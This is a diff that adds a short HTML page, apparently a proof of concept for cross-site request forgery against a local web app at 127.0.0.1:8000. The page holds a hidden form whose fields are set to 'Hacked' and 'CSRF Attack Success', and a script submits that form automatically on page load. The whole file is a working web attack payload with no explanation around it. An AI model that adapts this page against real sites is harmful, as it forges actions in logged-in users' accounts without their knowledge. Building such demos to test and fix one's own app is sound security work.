@@ -1,0 +1,9 @@
+<html>
+  <body>
+    <form action="http://127.0.0.1:8000/create/" method="POST">
+      <input type="hidden" name="title" value="Hacked">
+      <input type="hidden" name="secret_key" value="CSRF Attack Success">
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
